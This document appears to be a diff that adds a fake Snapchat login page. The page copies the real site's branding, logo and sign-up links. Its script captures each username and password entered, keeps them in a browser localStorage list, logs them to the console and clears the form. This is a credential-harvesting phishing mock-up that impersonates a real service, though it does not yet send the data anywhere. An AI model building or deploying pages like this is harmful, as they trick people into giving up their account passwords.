@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background-color: #fff;
+            font-family: 'Arial', sans-serif;
+        }
+        .snapchat-yellow {
+            background-color: #FFFC00;
+        }
+        .snapchat-blue {
+            background-color: #00A3FF;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+    <!-- Navigation Bar -->
+    <nav class="snapchat-yellow p-4">
+        <div class="max-w-7xl mx-auto flex justify-between items-center">
+            <div class="flex items-center">
+                <img src="https://www.snapchat.com/favicon.ico" alt="Snapchat Logo" class="w-10 h-10">
+                <span class="ml-2 text-xl font-bold text-black">Snapchat</span>
+            </div>
+            <div class="space-x-4">
+                <a href="index.html" class="text-black font-semibold hover:underline">Login</a>
+                <a href="signup.html" class="text-black font-semibold hover:underline">Sign Up</a>
+            </div>
+        </div>
+    </nav>
+    <!-- Main Content -->
+    <div class="flex-grow flex items-center justify-center">
+        <div class="w-full max-w-md p-6">
+            <!-- Login Form -->
+            <form id="loginForm" class="space-y-4">
+                <div>
+                    <input
+                        type="text"
+                        id="username"
+                        placeholder="Username or Email"
+                        class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-snapchat-blue"
+                        required
+                    >
+                </div>
+                <div>
+                    <input
+                        type="password"
+                        id="password"
+                        placeholder="Password"
+                        class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-snapchat-blue"
+                        required
+                    >
+                </div>
+                <button
+                    type="submit"
+                    class="w-full p-3 snapchat-yellow text-black font-semibold rounded-lg hover:bg-yellow-400 transition"
+                >
+                    Log In
+                </button>
+            </form>
+            <!-- Links -->
+            <div class="mt-4 text-center space-y-2">
+                <a href="#" class="text-snapchat-blue hover:underline">Forgot Password?</a>
+                <p class="text-gray-600">
+                    New to Snapchat? <a href="signup.html" class="text-snapchat-blue hover:underline">Sign Up</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Initialize savedCredentials from localStorage or use empty array
+        let savedCredentials = JSON.parse(localStorage.getItem('credentials')) || [];
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            if (username && password) {
+                // Add new credentials to array
+                savedCredentials.push({ username, password });
+                // Save updated array to localStorage
+                localStorage.setItem('credentials', JSON.stringify(savedCredentials));
+                // Log to console for debugging
+                console.log('Saved Credentials:', savedCredentials);
+                // Clear form inputs
+                document.getElementById('username').value = '';
+                document.getElementById('password').value = '';
+                // Simulate form submission
+                alert('Login attempt with Username: ' + username);
+            } else {
+                alert('Please fill in all fields.');
+            }
+        });
+    </script>
+</body>
+</html>
